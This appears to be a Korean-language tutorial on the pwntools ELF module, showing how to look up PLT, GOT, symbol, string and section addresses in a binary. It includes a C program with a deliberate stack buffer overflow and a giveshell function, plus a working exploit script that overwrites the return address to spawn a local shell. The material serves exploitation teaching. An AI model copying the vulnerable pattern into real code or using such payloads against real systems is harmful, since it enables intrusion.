pwntools - ELF :
    익스플로잇 코드를 작성할 때 함수 주소와 문자열 주소 등을 구해야 합니다. 
    이때, ELF를 사용하면 ELF 헤더를 갖고 있는 파일의 경우 파일의 여러 데이터를 가져올 수 있습니다.

    elf.c는 ELF를 사용하기 위한 예제이며, 스택 버퍼 오버플로우가 발생하는 코드입니다.
    ex)
        // gcc -o elf elf.c -fno-stack-protector
        #include <stdio.h>
        #include <stdlib.h>
        #include <unistd.h>
        void giveshell() {
            system("/bin/sh");
        }
        int main()
        {
            char buf[256];
            printf("Hello World!");
            read(0, buf, 1024);
            return 0;
        }

    다음과 같이 파일을 로딩할 수 있습니다.
    ex)
        elf = ELF('./elf')
        [*] '/home/theori/elf'
            Arch:     amd64-64-little
            RELRO:    Partial RELRO
            Stack:    No canary found
            NX:       NX enabled
            PIE:      No PIE (0x400000)

    ELF의 인자로 파일 경로를 전달하면 해당 파일에 적용된 보호 기법을 알 수 있고 파일의 객체는 elf 변수에 저장됩니다.

    plt는 바이너리에 존재하는 PLT 주소를 가져옵니다.
    ex)
        print hex(elf.plt['printf'])
        0x400480
        print hex(elf.plt['system'])
        0x40046c

    바이너리 내에 printf@plt와 system@plt가 존재한다면 해당하는 주소를 가져올 수 있습니다.

    got는 바이너리에 존재하는 GOT 주소를 가져옵니다.
    ex)
        print hex(elf.got['printf'])
        0x601020
        print hex(elf.got['system'])
        0x601018

    바이너리 내에 printf@got와 system@got가 존재한다면 해당하는 주소를 가져올 수 있습니다.

    symbols는 바이너리에 존재하는 함수의 주소를 가져옵니다.
    ex)
        print hex(elf.symbols['giveshell'])
        0x4005b6

    바이너리 내에 giveshell 함수가 존재한다면 해당하는 주소를 가져올 수 있습니다.
    strip과 같은 도구로 함수 심볼이 존재하지 않는다면 위와 같은 방법으로 주소를 가져올 수 없습니다.

    search는 바이너리에 존재하는 문자열의 주소를 가져옵니다.
    ex)
        print hex(next(elf.search("Hello World!")))
        0x40069c

    예제는 printf 함수의 인자로 "Hello World!" 문자열이 존재하기 때문에 해당 문자열의 주소를 가져올 수 있습니다.

    get_section_by_name은 바이너리에 존재하는 섹션의 주소를 가져옵니다.
    ex)
        print hex(elf.get_section_by_name('.bss').header.sh_addr)
        0x601048
        print hex(elf.get_section_by_name('.text').header.sh_addr)
        0x4004c0

    bss 섹션과 text 섹션의 주소를 가져올 수 있습니다.

    read는 원하는 바이너리 주소의 데이터를 읽어옵니다.
    ex)
        print `elf.read(0x400000, 4)`
        '\x7fELF'
        print `elf.read(elf.symbols['main'], 4)`
        'UH\x89\xe5'

    read의 인자로 바이너리의 주소와 읽을 바이트 수를 전달하면 해당하는 주소에 존재하는 값을 읽어옵니다.

    write는 원하는 바이너리 주소에 데이터를 씁니다.
    ex)
        print `elf.read(0x400000, 4)`
        '\x7fELF'
        
        elf.write(0x400000, "!!!")
        
        print `elf.read(0x400000, 4)`
        '!!!F'
        
        elf.write(0x400000, "\x7fELF")
       
        print `elf.read(0x400000, 4)`
        '\x7fELF

    0x400000 주소의 첫 4 바이트는 "\x7fELF" 값을 가지고 있습니다. 
    write를 사용해서 "!!!" 문자열을 삽입하면 해당하는 주소에 값이 쓰이게 됩니다. 
    이는 특정 영역의 코드를 수정하기 위해서 사용할 수 있습니다.

    elf.py는 ELF를 사용하여 리턴 주소를 giveshell 함수의 주소로 덮어쓰는 코드입니다.
    ex)
        # elf.py
        from pwn import *
        
        context.arch = 'x86_64'
        p = process("./elf")
        
        elf = ELF('./elf')
        
        payload = "A"*264
        payload += p64(elf.symbols['giveshell'])
        
        p.send(payload)
        
        p.interactive()

    리턴 주소가 giveshell로 조작되면서 셸을 획득하였습니다.
    ex)
        $ python elf.py
        [+] Starting local process './elf': pid 64468
        [*] '/home/theori/elf'
            Arch:     amd64-64-little
            RELRO:    Partial RELRO
            Stack:    No canary found
            NX:       NX enabled
            PIE:      No PIE (0x400000)
        [*] Switching to interactive mode
        $ id
        uid=1001(theori) gid=1001(theori) groups=1001(theori)






















